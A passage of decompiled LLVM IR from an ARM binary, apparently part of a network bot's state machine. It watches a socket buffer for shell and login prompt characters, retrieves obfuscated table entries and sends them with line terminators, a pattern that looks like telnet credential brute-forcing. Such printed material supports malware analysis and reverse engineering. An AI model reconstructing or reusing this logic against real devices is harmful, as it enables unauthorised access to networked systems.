  store i1 %v2_125cc, i1* %cpsr_z.global-to-local, align 1
  %tmp330 = icmp slt i32 %v0_125cc, 1
  br i1 %tmp330, label %dec_label_pc_12568, label %dec_label_pc_125d4

dec_label_pc_125d4:                               ; preds = %dec_label_pc_125cc
  %v0_125d4 = load i32, i32* @r5, align 4
  %v1_125d4 = inttoptr i32 %v0_125d4 to i32*
  %v2_125d4 = load i32, i32* %v1_125d4, align 4
  store i32 %v2_125d4, i32* %r3.global-to-local, align 4
  %v1_125d8 = add i32 %v0_125d4, 4
  %v2_125d8 = inttoptr i32 %v1_125d8 to i32*
  %v3_125d8 = load i32, i32* %v2_125d8, align 4
  store i32 %v3_125d8, i32* %r0.global-to-local, align 4
  %v1_125dc = add i32 %v2_125d4, 12
  %v2_125dc = inttoptr i32 %v1_125dc to i8*
  %v3_125dc = load i8, i8* %v2_125dc, align 1
  %v4_125dc = zext i8 %v3_125dc to i32
  store i32 %v4_125dc, i32* %r2.global-to-local, align 4
  %v1_125e0 = inttoptr i32 %v2_125d4 to i32*
  %v2_125e0 = load i32, i32* %v1_125e0, align 4
  store i32 %v2_125e0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_125e8 = inttoptr i32 %v2_125e0 to i32*
  %v5_125e8 = call i32 @send(i32 %v3_125d8, i32* %v4_125e8, i32 %v4_125dc, i32 16384)
  store i32 %v5_125e8, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_125f0 = load i32, i32* @r5, align 4
  %v1_125f0 = add i32 %v0_125f0, 4
  %v2_125f0 = inttoptr i32 %v1_125f0 to i32*
  %v3_125f0 = load i32, i32* %v2_125f0, align 4
  store i32 %v3_125f0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_125fc = call i32 @send(i32 %v3_125f0, i32* bitcast ([3 x i8]* @global_var_142f0.88 to i32*), i32 2, i32 16384)
  store i32 %v5_125fc, i32* %r0.global-to-local, align 4
  %v0_12600 = load i32, i32* @r5, align 4
  %v1_12600 = add i32 %v0_12600, 24
  %v2_12600 = inttoptr i32 %v1_12600 to i32*
  %v3_12600 = load i32, i32* %v2_12600, align 4
  store i32 %v3_12600, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_12608 = add i32 %v0_12600, 12
  %v3_12608 = inttoptr i32 %v2_12608 to i32*
  store i32 4, i32* %v3_12608, align 4
  br label %dec_label_pc_12ba4

dec_label_pc_12710:                               ; preds = %dec_label_pc_12458
  %v1_12710 = add i32 %v0_12458, 24
  %v2_12710 = inttoptr i32 %v1_12710 to i32*
  %v3_12710 = load i32, i32* %v2_12710, align 4
  store i32 %v3_12710, i32* %ip.global-to-local, align 4
  %v1_12714 = add i32 %v3_12710, -1
  store i32 %v1_12714, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12718 = icmp eq i32 %v1_12714, 0
  store i1 %v2_12718, i1* %cpsr_z.global-to-local, align 1
  %v5_1271c = icmp sgt i32 %v1_12714, 0
  br i1 %v5_1271c, label %dec_label_pc_1273c, label %dec_label_pc_12d84

dec_label_pc_12724:                               ; preds = %bb331
  %v2_12724 = icmp ugt i8 %v3_12740, 35
  store i1 %v2_12724, i1* %cpsr_c.global-to-local, align 1
  %v7_12724 = icmp eq i8 %v3_12740, 36
  store i1 %v7_12724, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12724, label %dec_label_pc_12750, label %dec_label_pc_1272c

dec_label_pc_1272c:                               ; preds = %dec_label_pc_12724
  %v2_1272c = icmp ugt i8 %v3_12740, 34
  store i1 %v2_1272c, i1* %cpsr_c.global-to-local, align 1
  %v7_1272c = icmp eq i8 %v3_12740, 35
  store i1 %v7_1272c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1272c, label %dec_label_pc_12750, label %dec_label_pc_12734

dec_label_pc_12734:                               ; preds = %dec_label_pc_1272c
  %v1_12734 = add i32 %v0_12750, -1
  store i32 %v1_12734, i32* %r0.global-to-local, align 4
  %v2_12734 = icmp ne i32 %v0_12750, 0
  store i1 %v2_12734, i1* %cpsr_c.global-to-local, align 1
  %v7_12734 = icmp eq i32 %v0_12750, 1
  store i1 %v7_12734, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12734, label %dec_label_pc_12d84, label %dec_label_pc_1273c

dec_label_pc_1273c:                               ; preds = %dec_label_pc_12710, %dec_label_pc_12734
  %v0_12750 = phi i32 [ %v1_12734, %dec_label_pc_12734 ], [ %v1_12714, %dec_label_pc_12710 ]
  %v2_1273c = add i32 %v0_12750, %v0_12458
  store i32 %v2_1273c, i32* %r3.global-to-local, align 4
  %v1_12740 = add i32 %v2_1273c, 28
  %v2_12740 = inttoptr i32 %v1_12740 to i8*
  %v3_12740 = load i8, i8* %v2_12740, align 1
  %v4_12740 = zext i8 %v3_12740 to i32
  store i32 %v4_12740, i32* %r3.global-to-local, align 4
  %v2_12744 = icmp ugt i8 %v3_12740, 61
  store i1 %v2_12744, i1* %cpsr_c.global-to-local, align 1
  %v7_12744 = icmp eq i8 %v3_12740, 62
  store i1 %v7_12744, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12744, label %dec_label_pc_12750, label %bb331

bb331:                                            ; preds = %dec_label_pc_1273c
  %v3_12748 = icmp ugt i8 %v3_12740, 57
  store i1 %v3_12748, i1* %cpsr_c.global-to-local, align 1
  %v8_12748 = icmp eq i8 %v3_12740, 58
  store i1 %v8_12748, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_12748, label %dec_label_pc_12750, label %dec_label_pc_12724

dec_label_pc_12750:                               ; preds = %dec_label_pc_1273c, %bb331, %dec_label_pc_1272c, %dec_label_pc_12724
  %v1_12750 = add i32 %v0_12750, 1
  store i32 %v1_12750, i32* @r7, align 4
  %v2_12754 = icmp eq i32 %v1_12750, -1
  store i1 %v2_12754, i1* %cpsr_c.global-to-local, align 1
  %v7_12754 = icmp eq i32 %v0_12750, -2
  store i1 %v7_12754, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12754, label %dec_label_pc_12d84, label %dec_label_pc_1275c

dec_label_pc_1275c:                               ; preds = %dec_label_pc_12750, %dec_label_pc_12d84
  %v0_1275c = phi i32 [ %v5_12d94, %dec_label_pc_12d84 ], [ %v1_12750, %dec_label_pc_12750 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1275c = icmp eq i32 %v0_1275c, 0
  store i1 %v2_1275c, i1* %cpsr_z.global-to-local, align 1
  %tmp332 = icmp slt i32 %v0_1275c, 1
  br i1 %tmp332, label %dec_label_pc_12568, label %dec_label_pc_12764

dec_label_pc_12764:                               ; preds = %dec_label_pc_1275c
  %v0_12764 = load i32, i32* @r5, align 4
  %v1_12764 = inttoptr i32 %v0_12764 to i32*
  %v2_12764 = load i32, i32* %v1_12764, align 4
  store i32 %v2_12764, i32* %r3.global-to-local, align 4
  %v1_12768 = add i32 %v0_12764, 4
  %v2_12768 = inttoptr i32 %v1_12768 to i32*
  %v3_12768 = load i32, i32* %v2_12768, align 4
  store i32 %v3_12768, i32* %r0.global-to-local, align 4
  %v1_1276c = add i32 %v2_12764, 13
  %v2_1276c = inttoptr i32 %v1_1276c to i8*
  %v3_1276c = load i8, i8* %v2_1276c, align 1
  %v4_1276c = zext i8 %v3_1276c to i32
  store i32 %v4_1276c, i32* %r2.global-to-local, align 4
  %v1_12770 = add i32 %v2_12764, 4
  %v2_12770 = inttoptr i32 %v1_12770 to i32*
  %v3_12770 = load i32, i32* %v2_12770, align 4
  store i32 %v3_12770, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_12778 = inttoptr i32 %v3_12770 to i32*
  %v5_12778 = call i32 @send(i32 %v3_12768, i32* %v4_12778, i32 %v4_1276c, i32 16384)
  store i32 %v5_12778, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_12780 = load i32, i32* @r5, align 4
  %v1_12780 = add i32 %v0_12780, 4
  %v2_12780 = inttoptr i32 %v1_12780 to i32*
  %v3_12780 = load i32, i32* %v2_12780, align 4
  store i32 %v3_12780, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_1278c = call i32 @send(i32 %v3_12780, i32* bitcast ([3 x i8]* @global_var_142f0.88 to i32*), i32 2, i32 16384)
  store i32 %v5_1278c, i32* %r0.global-to-local, align 4
  %v0_12790 = load i32, i32* @r5, align 4
  %v1_12790 = add i32 %v0_12790, 24
  %v2_12790 = inttoptr i32 %v1_12790 to i32*
  %v3_12790 = load i32, i32* %v2_12790, align 4
  store i32 %v3_12790, i32* %ip.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_12798 = add i32 %v0_12790, 12
  %v3_12798 = inttoptr i32 %v2_12798 to i32*
  store i32 5, i32* %v3_12798, align 4
  br label %dec_label_pc_12ba4

dec_label_pc_127a0:                               ; preds = %dec_label_pc_12458
  %v1_127a0 = add i32 %v0_12458, 24
  %v2_127a0 = inttoptr i32 %v1_127a0 to i32*
  %v3_127a0 = load i32, i32* %v2_127a0, align 4
  store i32 %v3_127a0, i32* %ip.global-to-local, align 4
  %v1_127a4 = add i32 %v3_127a0, -1
  store i32 %v1_127a4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_127a8 = icmp eq i32 %v1_127a4, 0
  store i1 %v2_127a8, i1* %cpsr_z.global-to-local, align 1
  %v5_127ac = icmp sgt i32 %v1_127a4, 0
  br i1 %v5_127ac, label %dec_label_pc_127d4, label %dec_label_pc_123d8thread-pre-split.thread

dec_label_pc_127b4:                               ; preds = %bb333
  %v2_127b4 = icmp ugt i8 %v3_127d8, 35
  store i1 %v2_127b4, i1* %cpsr_c.global-to-local, align 1
  %v7_127b4 = icmp eq i8 %v3_127d8, 36
  store i1 %v7_127b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_127b4, label %dec_label_pc_127e8, label %dec_label_pc_127bc

dec_label_pc_127bc:                               ; preds = %dec_label_pc_127b4
  %v2_127bc = icmp ugt i8 %v3_127d8, 34
  store i1 %v2_127bc, i1* %cpsr_c.global-to-local, align 1
  %v7_127bc = icmp eq i8 %v3_127d8, 35
  store i1 %v7_127bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_127bc, label %dec_label_pc_127e8, label %dec_label_pc_127c4

dec_label_pc_127c4:                               ; preds = %dec_label_pc_127bc
  %v2_127c4 = icmp ugt i8 %v3_127d8, 36
  store i1 %v2_127c4, i1* %cpsr_c.global-to-local, align 1
  %v7_127c4 = icmp eq i8 %v3_127d8, 37
  store i1 %v7_127c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_127c4, label %dec_label_pc_127e8, label %dec_label_pc_127cc

dec_label_pc_127cc:                               ; preds = %dec_label_pc_127c4
  %v1_127cc = add i32 %v0_127e8, -1
  store i32 %v1_127cc, i32* %r0.global-to-local, align 4
  %v2_127cc = icmp ne i32 %v0_127e8, 0
  store i1 %v2_127cc, i1* %cpsr_c.global-to-local, align 1
  %v7_127cc = icmp eq i32 %v0_127e8, 1
  store i1 %v7_127cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_127cc, label %dec_label_pc_123d8thread-pre-split, label %dec_label_pc_127d4

dec_label_pc_127d4:                               ; preds = %dec_label_pc_127a0, %dec_label_pc_127cc
  %v0_127e8 = phi i32 [ %v1_127cc, %dec_label_pc_127cc ], [ %v1_127a4, %dec_label_pc_127a0 ]
  %v2_127d4 = add i32 %v0_127e8, %v0_12458
  store i32 %v2_127d4, i32* %r3.global-to-local, align 4
  %v1_127d8 = add i32 %v2_127d4, 28
  %v2_127d8 = inttoptr i32 %v1_127d8 to i8*
  %v3_127d8 = load i8, i8* %v2_127d8, align 1
  %v4_127d8 = zext i8 %v3_127d8 to i32
  store i32 %v4_127d8, i32* %r3.global-to-local, align 4
  %v2_127dc = icmp ugt i8 %v3_127d8, 61
  store i1 %v2_127dc, i1* %cpsr_c.global-to-local, align 1
  %v7_127dc = icmp eq i8 %v3_127d8, 62
  store i1 %v7_127dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_127dc, label %dec_label_pc_127e8, label %bb333

bb333:                                            ; preds = %dec_label_pc_127d4
  %v3_127e0 = icmp ugt i8 %v3_127d8, 57
  store i1 %v3_127e0, i1* %cpsr_c.global-to-local, align 1
  %v8_127e0 = icmp eq i8 %v3_127d8, 58
  store i1 %v8_127e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_127e0, label %dec_label_pc_127e8, label %dec_label_pc_127b4

dec_label_pc_127e8:                               ; preds = %dec_label_pc_127d4, %bb333, %dec_label_pc_127c4, %dec_label_pc_127bc, %dec_label_pc_127b4
  %v1_127e8 = add i32 %v0_127e8, 1
  store i32 %v1_127e8, i32* @r7, align 4
  %v2_127ec = icmp eq i32 %v1_127e8, -1
  store i1 %v2_127ec, i1* %cpsr_c.global-to-local, align 1
  %v7_127ec = icmp eq i32 %v0_127e8, -2
  store i1 %v7_127ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_127ec, label %dec_label_pc_123d8thread-pre-split, label %dec_label_pc_127f4

dec_label_pc_127f4:                               ; preds = %dec_label_pc_127e8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_127f4 = icmp eq i32 %v1_127e8, 0
  store i1 %v2_127f4, i1* %cpsr_z.global-to-local, align 1
  %tmp334 = icmp slt i32 %v1_127e8, 1
  br i1 %tmp334, label %dec_label_pc_12568, label %dec_label_pc_127fc

dec_label_pc_127fc:                               ; preds = %dec_label_pc_127f4
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_12800 = call i32 @function_13074(i32 21)
  store i32 %v2_12808, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v3_12810 = call i32 @function_12f90(i32 21, i32* nonnull %stack_var_-56)
  store i32 %v3_12810, i32* %r0.global-to-local, align 4
  %v3_12814 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_12814, i32* %r2.global-to-local, align 4
  store i32 %v3_12810, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12820 = load i32, i32* @r5, align 4
  %v1_12820 = add i32 %v0_12820, 4
  %v2_12820 = inttoptr i32 %v1_12820 to i32*
  %v3_12820 = load i32, i32* %v2_12820, align 4
  store i32 %v3_12820, i32* %r0.global-to-local, align 4
  %v4_12824 = inttoptr i32 %v3_12810 to i32*
  %v5_12824 = call i32 @send(i32 %v3_12820, i32* %v4_12824, i32 %v3_12814, i32 16384)
  store i32 %v5_12824, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12834 = load i32, i32* @r5, align 4
  %v1_12834 = add i32 %v0_12834, 4
  %v2_12834 = inttoptr i32 %v1_12834 to i32*
  %v3_12834 = load i32, i32* %v2_12834, align 4
  store i32 %v3_12834, i32* %r0.global-to-local, align 4
  %v5_12838 = call i32 @send(i32 %v3_12834, i32* bitcast ([3 x i8]* @global_var_142f0.88 to i32*), i32 2, i32 16384)
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_12840 = call i32 @function_12fbc(i32 21)
  store i32 %v1_12840, i32* %r0.global-to-local, align 4
  %v0_12844 = load i32, i32* @r5, align 4
  %v1_12844 = add i32 %v0_12844, 24
  %v2_12844 = inttoptr i32 %v1_12844 to i32*
  %v3_12844 = load i32, i32* %v2_12844, align 4
  store i32 %v3_12844, i32* %ip.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v2_1284c = add i32 %v0_12844, 12
  %v3_1284c = inttoptr i32 %v2_1284c to i32*
  store i32 6, i32* %v3_1284c, align 4
  br label %dec_label_pc_12ba4

dec_label_pc_12854:                               ; preds = %dec_label_pc_12458
  %v1_12854 = add i32 %v0_12458, 24
  %v2_12854 = inttoptr i32 %v1_12854 to i32*
  %v3_12854 = load i32, i32* %v2_12854, align 4
  store i32 %v3_12854, i32* %ip.global-to-local, align 4
  %v1_12858 = add i32 %v3_12854, -1
  store i32 %v1_12858, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1285c = icmp eq i32 %v1_12858, 0
  store i1 %v2_1285c, i1* %cpsr_z.global-to-local, align 1
  %v5_12860 = icmp sgt i32 %v1_12858, 0
  br i1 %v5_12860, label %dec_label_pc_12888, label %dec_label_pc_123d8thread-pre-split.thread

dec_label_pc_12868:                               ; preds = %bb335
  %v2_12868 = icmp ugt i8 %v3_1288c, 35
  store i1 %v2_12868, i1* %cpsr_c.global-to-local, align 1
  %v7_12868 = icmp eq i8 %v3_1288c, 36
  store i1 %v7_12868, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12868, label %dec_label_pc_1289c, label %dec_label_pc_12870

dec_label_pc_12870:                               ; preds = %dec_label_pc_12868
  %v2_12870 = icmp ugt i8 %v3_1288c, 34
  store i1 %v2_12870, i1* %cpsr_c.global-to-local, align 1
  %v7_12870 = icmp eq i8 %v3_1288c, 35
  store i1 %v7_12870, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12870, label %dec_label_pc_1289c, label %dec_label_pc_12878

dec_label_pc_12878:                               ; preds = %dec_label_pc_12870
  %v2_12878 = icmp ugt i8 %v3_1288c, 36
  store i1 %v2_12878, i1* %cpsr_c.global-to-local, align 1
  %v7_12878 = icmp eq i8 %v3_1288c, 37
  store i1 %v7_12878, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12878, label %dec_label_pc_1289c, label %dec_label_pc_12880

dec_label_pc_12880:                               ; preds = %dec_label_pc_12878
  %v1_12880 = add i32 %v0_1289c, -1
  store i32 %v1_12880, i32* %r0.global-to-local, align 4
  %v2_12880 = icmp ne i32 %v0_1289c, 0
  store i1 %v2_12880, i1* %cpsr_c.global-to-local, align 1
  %v7_12880 = icmp eq i32 %v0_1289c, 1
  store i1 %v7_12880, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12880, label %dec_label_pc_123d8thread-pre-split, label %dec_label_pc_12888

dec_label_pc_12888:                               ; preds = %dec_label_pc_12854, %dec_label_pc_12880
  %v0_1289c = phi i32 [ %v1_12880, %dec_label_pc_12880 ], [ %v1_12858, %dec_label_pc_12854 ]
  %v2_12888 = add i32 %v0_1289c, %v0_12458
  store i32 %v2_12888, i32* %r3.global-to-local, align 4
  %v1_1288c = add i32 %v2_12888, 28
  %v2_1288c = inttoptr i32 %v1_1288c to i8*
  %v3_1288c = load i8, i8* %v2_1288c, align 1
  %v4_1288c = zext i8 %v3_1288c to i32
  store i32 %v4_1288c, i32* %r3.global-to-local, align 4
  %v2_12890 = icmp ugt i8 %v3_1288c, 61
  store i1 %v2_12890, i1* %cpsr_c.global-to-local, align 1
  %v7_12890 = icmp eq i8 %v3_1288c, 62
  store i1 %v7_12890, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12890, label %dec_label_pc_1289c, label %bb335

bb335:                                            ; preds = %dec_label_pc_12888
  %v3_12894 = icmp ugt i8 %v3_1288c, 57
  store i1 %v3_12894, i1* %cpsr_c.global-to-local, align 1
  %v8_12894 = icmp eq i8 %v3_1288c, 58
  store i1 %v8_12894, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_12894, label %dec_label_pc_1289c, label %dec_label_pc_12868

dec_label_pc_1289c:                               ; preds = %dec_label_pc_12888, %bb335, %dec_label_pc_12878, %dec_label_pc_12870, %dec_label_pc_12868
  %v1_1289c = add i32 %v0_1289c, 1
  store i32 %v1_1289c, i32* @r7, align 4
  %v2_128a0 = icmp eq i32 %v1_1289c, -1
  store i1 %v2_128a0, i1* %cpsr_c.global-to-local, align 1
  %v7_128a0 = icmp eq i32 %v0_1289c, -2
  store i1 %v7_128a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_128a0, label %dec_label_pc_123d8thread-pre-split, label %dec_label_pc_128a8

dec_label_pc_128a8:                               ; preds = %dec_label_pc_1289c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_128a8 = icmp eq i32 %v1_1289c, 0
  store i1 %v2_128a8, i1* %cpsr_z.global-to-local, align 1
  %tmp336 = icmp slt i32 %v1_1289c, 1
  br i1 %tmp336, label %dec_label_pc_12568, label %dec_label_pc_128b0

dec_label_pc_128b0:                               ; preds = %dec_label_pc_128a8
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_128b4 = call i32 @function_13074(i32 22)
  store i32 %v2_128bc, i32* %r1.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v3_128c4 = call i32 @function_12f90(i32 22, i32* nonnull %stack_var_-48)
  store i32 %v3_128c4, i32* %r0.global-to-local, align 4
  %v3_128c8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_128c8, i32* %r2.global-to-local, align 4
  store i32 %v3_128c4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_128d4 = load i32, i32* @r5, align 4
  %v1_128d4 = add i32 %v0_128d4, 4
  %v2_128d4 = inttoptr i32 %v1_128d4 to i32*
  %v3_128d4 = load i32, i32* %v2_128d4, align 4
  store i32 %v3_128d4, i32* %r0.global-to-local, align 4
  %v4_128d8 = inttoptr i32 %v3_128c4 to i32*
  %v5_128d8 = call i32 @send(i32 %v3_128d4, i32* %v4_128d8, i32 %v3_128c8, i32 16384)
  store i32 %v5_128d8, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_128e8 = load i32, i32* @r5, align 4
  %v1_128e8 = add i32 %v0_128e8, 4
  %v2_128e8 = inttoptr i32 %v1_128e8 to i32*
  %v3_128e8 = load i32, i32* %v2_128e8, align 4
  store i32 %v3_128e8, i32* %r0.global-to-local, align 4
  %v5_128ec = call i32 @send(i32 %v3_128e8, i32* bitcast ([3 x i8]* @global_var_142f0.88 to i32*), i32 2, i32 16384)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_128f4 = call i32 @function_12fbc(i32 22)
  store i32 %v1_128f4, i32* %r0.global-to-local, align 4
  %v0_128f8 = load i32, i32* @r5, align 4
  %v1_128f8 = add i32 %v0_128f8, 24
  %v2_128f8 = inttoptr i32 %v1_128f8 to i32*
  %v3_128f8 = load i32, i32* %v2_128f8, align 4
  store i32 %v3_128f8, i32* %ip.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v2_12900 = add i32 %v0_128f8, 12
  %v3_12900 = inttoptr i32 %v2_12900 to i32*
  store i32 7, i32* %v3_12900, align 4
  br label %dec_label_pc_12ba4

dec_label_pc_12908:                               ; preds = %dec_label_pc_12458
  %v1_12908 = add i32 %v0_12458, 24
  %v2_12908 = inttoptr i32 %v1_12908 to i32*
  %v3_12908 = load i32, i32* %v2_12908, align 4
  store i32 %v3_12908, i32* %ip.global-to-local, align 4
  %v1_1290c = add i32 %v3_12908, -1
  store i32 %v1_1290c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12910 = icmp eq i32 %v1_1290c, 0
  store i1 %v2_12910, i1* %cpsr_z.global-to-local, align 1
  %v5_12914 = icmp sgt i32 %v1_1290c, 0
  br i1 %v5_12914, label %dec_label_pc_1293c, label %dec_label_pc_123d8thread-pre-split.thread

dec_label_pc_1291c:                               ; preds = %bb337
  %v2_1291c = icmp ugt i8 %v3_12940, 35
  store i1 %v2_1291c, i1* %cpsr_c.global-to-local, align 1
  %v7_1291c = icmp eq i8 %v3_12940, 36
  store i1 %v7_1291c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1291c, label %dec_label_pc_12950, label %dec_label_pc_12924

dec_label_pc_12924:                               ; preds = %dec_label_pc_1291c
  %v2_12924 = icmp ugt i8 %v3_12940, 34
  store i1 %v2_12924, i1* %cpsr_c.global-to-local, align 1
  %v7_12924 = icmp eq i8 %v3_12940, 35
  store i1 %v7_12924, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12924, label %dec_label_pc_12950, label %dec_label_pc_1292c

dec_label_pc_1292c:                               ; preds = %dec_label_pc_12924
  %v2_1292c = icmp ugt i8 %v3_12940, 36
  store i1 %v2_1292c, i1* %cpsr_c.global-to-local, align 1
  %v7_1292c = icmp eq i8 %v3_12940, 37
  store i1 %v7_1292c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1292c, label %dec_label_pc_12950, label %dec_label_pc_12934

dec_label_pc_12934:                               ; preds = %dec_label_pc_1292c
  %v1_12934 = add i32 %v0_12950, -1
  store i32 %v1_12934, i32* %r0.global-to-local, align 4
  %v2_12934 = icmp ne i32 %v0_12950, 0
  store i1 %v2_12934, i1* %cpsr_c.global-to-local, align 1
  %v7_12934 = icmp eq i32 %v0_12950, 1
  store i1 %v7_12934, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12934, label %dec_label_pc_123d8thread-pre-split, label %dec_label_pc_1293c

dec_label_pc_1293c:                               ; preds = %dec_label_pc_12908, %dec_label_pc_12934
  %v0_12950 = phi i32 [ %v1_12934, %dec_label_pc_12934 ], [ %v1_1290c, %dec_label_pc_12908 ]
  %v2_1293c = add i32 %v0_12950, %v0_12458
  store i32 %v2_1293c, i32* %r3.global-to-local, align 4
  %v1_12940 = add i32 %v2_1293c, 28
  %v2_12940 = inttoptr i32 %v1_12940 to i8*
  %v3_12940 = load i8, i8* %v2_12940, align 1
  %v4_12940 = zext i8 %v3_12940 to i32
  store i32 %v4_12940, i32* %r3.global-to-local, align 4
  %v2_12944 = icmp ugt i8 %v3_12940, 61
  store i1 %v2_12944, i1* %cpsr_c.global-to-local, align 1
  %v7_12944 = icmp eq i8 %v3_12940, 62
  store i1 %v7_12944, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12944, label %dec_label_pc_12950, label %bb337

bb337:                                            ; preds = %dec_label_pc_1293c
  %v3_12948 = icmp ugt i8 %v3_12940, 57
  store i1 %v3_12948, i1* %cpsr_c.global-to-local, align 1
  %v8_12948 = icmp eq i8 %v3_12940, 58
  store i1 %v8_12948, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_12948, label %dec_label_pc_12950, label %dec_label_pc_1291c

dec_label_pc_12950:                               ; preds = %dec_label_pc_1293c, %bb337, %dec_label_pc_1292c, %dec_label_pc_12924, %dec_label_pc_1291c
  %v1_12950 = add i32 %v0_12950, 1
  store i32 %v1_12950, i32* @r7, align 4
  %v2_12954 = icmp eq i32 %v1_12950, -1
  store i1 %v2_12954, i1* %cpsr_c.global-to-local, align 1
  %v7_12954 = icmp eq i32 %v0_12950, -2
  store i1 %v7_12954, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12954, label %dec_label_pc_123d8thread-pre-split, label %dec_label_pc_1295c

dec_label_pc_1295c:                               ; preds = %dec_label_pc_12950
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1295c = icmp eq i32 %v1_12950, 0
  store i1 %v2_1295c, i1* %cpsr_z.global-to-local, align 1
  %tmp338 = icmp slt i32 %v1_12950, 1
  br i1 %tmp338, label %dec_label_pc_12568, label %dec_label_pc_12964

dec_label_pc_12964:                               ; preds = %dec_label_pc_1295c
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_12968 = call i32 @function_13074(i32 23)
  store i32 %v2_12808, i32* %r1.global-to-local, align 4
  store i32 23, i32* %r0.global-to-local, align 4
  %v3_12978 = call i32 @function_12f90(i32 23, i32* nonnull %stack_var_-56)
  store i32 %v3_12978, i32* %r0.global-to-local, align 4
  %v3_1297c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_1297c, i32* %r2.global-to-local, align 4
  store i32 %v3_12978, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12988 = load i32, i32* @r5, align 4
  %v1_12988 = add i32 %v0_12988, 4
  %v2_12988 = inttoptr i32 %v1_12988 to i32*
  %v3_12988 = load i32, i32* %v2_12988, align 4
  store i32 %v3_12988, i32* %r0.global-to-local, align 4
  %v4_1298c = inttoptr i32 %v3_12978 to i32*
  %v5_1298c = call i32 @send(i32 %v3_12988, i32* %v4_1298c, i32 %v3_1297c, i32 16384)
  store i32 %v5_1298c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1299c = load i32, i32* @r5, align 4
  %v1_1299c = add i32 %v0_1299c, 4
  %v2_1299c = inttoptr i32 %v1_1299c to i32*
  %v3_1299c = load i32, i32* %v2_1299c, align 4
  store i32 %v3_1299c, i32* %r0.global-to-local, align 4
  %v5_129a0 = call i32 @send(i32 %v3_1299c, i32* bitcast ([3 x i8]* @global_var_142f0.88 to i32*), i32 2, i32 16384)
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_129a8 = call i32 @function_12fbc(i32 23)
  store i32 %v1_129a8, i32* %r0.global-to-local, align 4
  %v0_129ac = load i32, i32* @r5, align 4
